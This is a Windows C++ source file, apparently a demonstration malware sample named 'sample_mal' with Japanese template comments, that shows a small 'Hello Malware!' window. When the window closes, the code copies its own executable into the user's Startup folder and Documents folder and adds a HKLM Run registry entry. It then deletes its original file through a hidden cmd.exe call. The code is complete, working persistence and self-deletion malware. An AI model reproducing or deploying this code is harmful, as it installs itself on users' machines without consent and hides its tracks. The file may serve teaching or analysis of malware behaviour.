// sample_mal.cpp : アプリケーションのエントリ ポイントを定義します。
//

#include "stdafx.h"
#include "sample_mal.h"

#define MAX_LOADSTRING 100

// グローバル変数:
HINSTANCE hInst;								// 現在のインターフェイス
TCHAR szTitle[MAX_LOADSTRING];					// タイトル バーのテキスト
TCHAR szWindowClass[MAX_LOADSTRING];			// メイン ウィンドウ クラス名

// このコード モジュールに含まれる関数の宣言を転送します:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

#include <shlwapi.h>
#include <shlobj.h>
#pragma comment(lib, "shlwapi.lib")
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: ここにコードを挿入してください。
	MSG msg;
	HACCEL hAccelTable;

	TCHAR szMe[1024];
	TCHAR szPath[1024];

	// file exist?
	GetModuleFileName(NULL, szMe, sizeof(szMe));
	SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
	lstrcat(szPath, "\\0.exe");
	if(lstrcmp(szPath, szMe) != 0){
		if(PathFileExists(szPath)){
			return FALSE;
		}
	}

	// グローバル文字列を初期化しています。
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_SAMPLE_MAL, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// アプリケーションの初期化を実行します:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SAMPLE_MAL));

	// メイン メッセージ ループ:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  関数: MyRegisterClass()
//
//  目的: ウィンドウ クラスを登録します。
//
//  コメント:
//
//    この関数および使い方は、'RegisterClassEx' 関数が追加された
//    Windows 95 より前の Win32 システムと互換させる場合にのみ必要です。
//    アプリケーションが、関連付けられた
//    正しい形式の小さいアイコンを取得できるようにするには、
//    この関数を呼び出してください。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SAMPLE_MAL));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_SAMPLE_MAL);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   関数: InitInstance(HINSTANCE, int)
//
//   目的: インスタンス ハンドルを保存して、メイン ウィンドウを作成します。
//
//   コメント:
//
//        この関数で、グローバル変数でインスタンス ハンドルを保存し、
//        メイン プログラム ウィンドウを作成および表示します。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // グローバル変数にインスタンス処理を格納します。

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      /*CW_USEDEFAULT*/200, 100, /*CW_USEDEFAULT*/200, 100, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  関数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:  メイン ウィンドウのメッセージを処理します。
//
//  WM_COMMAND	- アプリケーション メニューの処理
//  WM_PAINT	- メイン ウィンドウの描画
//  WM_DESTROY	- 中止メッセージを表示して戻る
//
//
#include <shellapi.h>
BOOL SelfDelete(void)
{
	TCHAR szFile[MAX_PATH];
	TCHAR szCommand[MAX_PATH];
	if(GetModuleFileName(NULL, szFile, MAX_PATH) &&
		GetShortPathName(szFile, szFile, MAX_PATH))
	{
		lstrcpy(szCommand, "/c del ");
		lstrcat(szCommand, szFile);
		lstrcat(szCommand, " >> NUL");
		if(GetEnvironmentVariable(
			"ComSpec", szFile, MAX_PATH) &&
			(INT)ShellExecute(
			0, 0, szFile, szCommand, 0, SW_HIDE) > 32)
		{
			return TRUE;
		}
	}
	return FALSE;
}

BOOL SetRegValue(HKEY root, TCHAR *path, TCHAR *key, TCHAR *data, int len)
{
    HKEY hRegKey;
    DWORD dwDisp;
    BOOL bRet = FALSE;
	hRegKey = NULL;

	if(RegCreateKeyEx(root, path, NULL, "", REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hRegKey, &dwDisp) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(hRegKey, key, 0, REG_SZ,
			(LPBYTE)data, len) == ERROR_SUCCESS)
		{
			bRet = TRUE;
		}
		RegCloseKey(hRegKey);
	}
	return bRet;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	TCHAR szMe[1024];
	TCHAR szPath[1024];
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_CREATE:
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 選択されたメニューの解析:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: 描画コードをここに追加してください...
		TextOut(hdc, 40, 10, "Hello Malware!", 14);
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		// file
		GetModuleFileName(NULL, szMe, sizeof(szMe));
		SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
		lstrcat(szPath, "\\0.exe");
		CopyFile(szMe, szPath, FALSE);
		// reg
		SHGetSpecialFolderPath(NULL, szPath, CSIDL_PERSONAL, FALSE);
		lstrcat(szPath, "\\1.exe");
		CopyFile(szMe, szPath, FALSE);
		SetRegValue(HKEY_LOCAL_MACHINE, 
			"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
			"sample_mal", szPath, strlen(szPath));
		SelfDelete();
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// バージョン情報ボックスのメッセージ ハンドラーです。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
